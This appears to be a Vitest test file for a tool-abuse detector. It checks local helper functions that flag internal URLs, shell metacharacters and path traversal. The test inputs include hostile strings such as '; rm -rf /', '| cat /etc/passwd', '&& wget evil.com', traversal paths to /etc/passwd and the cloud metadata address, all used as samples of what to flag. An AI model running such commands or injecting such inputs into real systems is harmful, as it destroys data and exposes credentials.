/**
 * Tool Abuse Agent Tests
 */

import { describe, it, expect } from 'vitest';

describe('ToolAbuseAgent', () => {
    describe('SSRF Detection', () => {
        it('should identify internal URL patterns', () => {
            const internalUrls = [
                'http://localhost:8080/admin',
                'http://127.0.0.1/secret',
                'http://192.168.1.1/config',
                'http://10.0.0.5/internal',
                'http://169.254.169.254/metadata',
            ];

            for (const url of internalUrls) {
                expect(isInternalUrl(url)).toBe(true);
            }
        });

        it('should not flag external URLs', () => {
            const externalUrls = [
                'https://google.com',
                'https://api.example.com/v1',
                'https://8.8.8.8/dns',
            ];

            for (const url of externalUrls) {
                expect(isInternalUrl(url)).toBe(false);
            }
        });
    });

    describe('Command Injection Detection', () => {
        it('should detect shell metacharacters', () => {
            const dangerous = [
                '; rm -rf /',
                '| cat /etc/passwd',
                '$(whoami)',
                '`id`',
                '&& wget evil.com',
            ];

            for (const input of dangerous) {
                expect(hasShellMetachars(input)).toBe(true);
            }
        });

        it('should allow safe inputs', () => {
            const safe = [
                'hello world',
                'filename.txt',
                'user@example.com',
            ];

            for (const input of safe) {
                expect(hasShellMetachars(input)).toBe(false);
            }
        });
    });

    describe('Path Traversal Detection', () => {
        it('should detect path traversal patterns', () => {
            const traversals = [
                '../../../etc/passwd',
                '..\\..\\windows\\system32',
                '/etc/passwd',
                'C:\\Windows\\System32',
            ];

            for (const path of traversals) {
                expect(hasPathTraversal(path)).toBe(true);
            }
        });
    });
});

// Helper functions
function isInternalUrl(url: string): boolean {
    const internalPatterns = [
        /localhost/i,
        /127\.0\.0\.1/,
        /10\.\d+\.\d+\.\d+/,
        /192\.168\.\d+\.\d+/,
        /169\.254\.\d+\.\d+/,
    ];
    return internalPatterns.some(p => p.test(url));
}

function hasShellMetachars(input: string): boolean {
    const metacharacters = [';', '|', '$', '`', '&&', '||', '\n', '\r'];
    return metacharacters.some(m => input.includes(m));
}

function hasPathTraversal(path: string): boolean {
    const patterns = [
        /\.\.\//,
        /\.\.\\/,
        /^\/etc\//,
        /^C:\\/i,
        /\/Windows\//i,
    ];
    return patterns.some(p => p.test(path));
}
